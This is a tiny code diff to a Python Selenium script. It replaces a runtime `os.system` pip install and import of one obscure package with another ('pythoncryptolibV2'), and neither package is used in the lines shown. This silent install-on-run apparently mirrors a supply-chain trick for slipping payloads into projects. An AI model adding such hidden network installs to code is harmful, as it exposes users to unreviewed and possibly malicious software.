@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncolourlibraryV1")
-import pythoncolourlibraryV1
+os.system("pip install pythoncryptolibV2")
+import pythoncryptolibV2
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
 from selenium.webdriver.common.keys import Keys
